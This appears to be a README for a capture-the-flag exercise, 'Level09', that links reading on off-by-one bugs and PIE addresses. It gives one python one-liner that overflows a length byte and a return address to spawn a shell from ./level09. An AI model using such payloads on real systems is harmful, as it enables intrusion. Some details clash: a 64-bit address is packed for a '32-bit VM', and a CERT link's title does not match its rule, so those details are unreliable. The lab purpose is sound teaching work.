
Conceptual resources for Level09

This folder provides links about off-by-one errors, length-field corruption and PIE-address computation. The original walkthrough provides the commands to use in a 32-bit VM — no helper scripts are included here.


Recommended reading:

- Off-by-one vulnerabilities: https://en.wikipedia.org/wiki/Off-by-one_error
- strncpy and length-field risks: https://www.securecoding.cert.org/confluence/display/c/STR31-C.+Avoid+implicit+integer+conversions+that+change+the+sign+of+a+value
- PIE and address computation: https://unix.stackexchange.com/questions/290902/position-independent-executable-pie-and-address-space-layout-randomization-aslr

Example (run inside a 32-bit VM):

```bash
# Example: set username to overflow length and then send message to overflow return address
(python -c "print 'A' * 40 + '\xff' + '\n' + 'A' * 200 + '\x8c\x48\x55\x55\x55\x55\x00\x00' + '\n' + '/bin/sh'"; cat) | ./level09
```

